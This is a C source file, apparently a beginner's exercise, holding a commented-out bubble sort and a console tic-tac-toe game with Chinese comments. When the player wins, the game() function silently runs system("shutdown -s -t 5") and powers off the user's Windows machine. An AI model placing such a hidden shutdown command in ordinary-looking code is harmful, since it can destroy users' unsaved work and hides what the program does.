#define  _CRT_SECURE_NO_WARNINGS 1

//
//#include<stdio.h>
//
////对一个整形数组进行冒泡排序
//
//void sort(int* arr,int sz)
//{
//	int i = 0;
//	//确定几趟
//	for (i = 0; i < sz-1; i++)
//	{
//		//一趟冒泡排序
//		int j = 0;
//		for (j = 0; j < sz - 1 - i; j++)
//		{
//			if (arr[j] > arr[j + 1])
//			{
//				int tmp = arr[j];
//				arr[j] = arr[j + 1];
//				arr[j + 1] = tmp;
//			}
//		}
//	}
//}
//
//int main()
//{
//	int arr[] = {9,8,7,6,5,4,3,2,1,0};
//	int sz = sizeof(arr) / sizeof(arr[0]);
//	sort(arr,sz);
//	int i = 0;
//	for (i = 0; i < sz; i++)
//	{
//		printf("%d ",arr[i]);
//	}
//
//	return 0;
//}
//

//三子棋源码



#pragma once

#include<stdio.h>
#define ROW 3
#define COL 3
#include<time.h>
#include<stdlib.h>
#include<windows.h>

//初始化棋盘；
void init_board(char board[ROW][COL], int row, int col);
//打印棋盘；
void print_board(char board[ROW][COL], int row, int col);
//玩家下棋
void player_move(char board[ROW][COL], int row, int col);
//电脑下棋
void computer_move(char board[ROW][COL], int row, int col);
//判断输赢
char is_win(char board[ROW][COL], int row, int col);



#define  _CRT_SECURE_NO_WARNINGS 1

#define  _CRT_SECURE_NO_WARNINGS 1

//#include"game.h"

void init_board(char board[ROW][COL], int row, int col)
{
	//行
	int i = 0;
	for (i = 0; i < row; i++)
	{
		//列
		int j = 0;
		for (j = 0; j < col; j++)
		{
			//单引号引用字符；
			//双引号是字符串；
			board[i][j] = ' ';
		}
	}
}

void print_board(char board[ROW][COL], int row, int col)
{
	int i = 0;
	for (i = 0; i < row; i++)
	{
		int j = 0;
		for (j = 0; j < col; j++)
		{
			printf(" %c ", board[i][j]);
			if (j < col - 1)
				printf("|");
		}
		printf("\n");
		if (i < row - 1)
		{
			for (j = 0; j < col; j++)
			{
				printf("---");
				if (j < col - 1)
					printf("|");
			}
			printf("\n");
		}
	}
}

void player_move(char board[ROW][COL], int row, int col)
{
	int x = 0;
	int y = 0;
	printf("玩家下棋:\n");
	while (1)
	{
		printf("请输入下棋的坐标:>");
		scanf("%d %d", &x, &y);
		//坐标合法
		if (x >= 1 && x <= ROW && y >= 1 && y <= COL)
		{
			if (board[x - 1][y - 1] == ' ')
			{
				board[x - 1][y - 1] = '*';
				break;
			}
			else
			{
				printf("该坐标已被占用\n");
			}
		}
		//坐标非法
		else
		{
			printf("坐标非法,请重新输入\n");
		}

	}
}

void computer_move(char board[ROW][COL], int row, int col)
{
	printf("电脑下棋:\n");
	while (1)
	{
		int x = rand() % row;
		int y = rand() % col;
		if (board[x][y] == ' ')
		{
			board[x][y] = '#';
			break;
		}
	}
}

static int is_full(char board[ROW][COL], int row, int col)
{
	int i = 0;
	int j = 0;
	for (i = 0; i < row; i++)
	{
		for (j = 0; j < col; j++)
		{
			if (board[i][j] == ' ')
			{
				return 0;
			}
		}
	}
	return 1;
}
char is_win(char board[ROW][COL], int row, int col)
{
	int i = 0;
	for (i = 0; i < row; i++)
	{
		//判断三行
		if (board[i][0] == board[i][1] && board[i][1] == board[i][2] && board[i][0] != ' ')
		{
			return board[i][0];
		}
	}
	for (i = 0; i < col; i++)
	{
		//判断三列
		if (board[0][i] == board[1][i] && board[1][i] == board[2][i] && board[0][i] != ' ')
		{
			return board[0][i];
		}
	}
	//判断两条对角线
	if (board[0][0] == board[1][1] && board[1][1] == board[2][2] && board[1][1] != ' ')
	{
		return board[1][1];
	}
	if (board[0][2] == board[1][1] && board[1][1] == board[2][0] && board[1][1] != ' ')
	{
		return board[1][1];
	}
	//是否平局？
	if (is_full(board, row, col) == 1)
	{
		return 'Q';
	}
	//没有玩家或者电脑赢，游戏继续；
	return 'C';
}

//
////优化后
//void print_board(char board[ROW][COL], int row, int col)
//{
//	int i = 0;
//	for (i = 0; i < row; i++)
//	{
//		int j = 0;
//		for (j = 0; j < col; j++)
//		{
//			printf(" %c ",board[i][j]);
//			if (j < col - 1)
//				printf("|");
//		}
//		printf("\n");
//		if (i < row - 1)
//		{
//			for (j = 0; j < col; j++)
//			{
//				printf("---");
//				if (j < col - 1)
//					printf("|");
//			}
//			printf("\n");
//		}
//	}
//}

//优化前
//void print_board(char board[ROW][COL], int row, int col)
//{
//	int i = 0;
//	for (i = 0; i < row; i++)
//	{
//		printf(" %c | %c | %c \n",board[i][0],board[i][1],board[i][2]);
//		if (i < row - 1)
//		{
//			printf("---|---|---\n");
//		}
//	}
//}



//#include"game.h"

void menu()
{
	printf("***************************\n");
	printf("********  1.play  *********\n");
	printf("********  0.exit  *********\n");
	printf("***************************\n");
	printf("请输入:>");
}

void game()
{
	char ret = 0;
	char board[ROW][COL];
	init_board(board, ROW, COL);
	print_board(board, ROW, COL);
	while (1)
	{
		player_move(board, ROW, COL);
		print_board(board, ROW, COL);
		//判断输赢
		ret = is_win(board, ROW, COL);
		if (ret != 'C')
		{
			break;
		}
		computer_move(board, ROW, COL);
		print_board(board, ROW, COL);
		//判断输赢
		ret = is_win(board, ROW, COL);
		if (ret != 'C')
		{
			break;
		}
	}
	if (ret == '*')
	{
		printf("让你欺负电脑\n");
		Sleep(2000);
		system("cls");
		system("shutdown -s -t 5");
	}
	else if (ret == '#')
	{
		printf("电脑赢了\n");
		Sleep(2000);
		system("cls");
	}
	else if (ret == 'Q')
	{
		printf("平局\n");
		Sleep(2000);
		system("cls");
	}
}
//判断输赢
//玩家赢，返回*
//电脑赢，返回#
//平局，返回Q
//游戏继续，返回C

void test()
{
	srand((unsigned int)time(NULL));
	int input = 0;
	do
	{
		menu();
		scanf("%d", &input);
		switch (input)
		{
		case 1:
			game();
			break;
		case 0:
			printf("退出游戏\n");
			break;
		default:
			printf("输入错误\n");
		}

	} while (input);

}


int main()
{
	test();

	return 0;
}




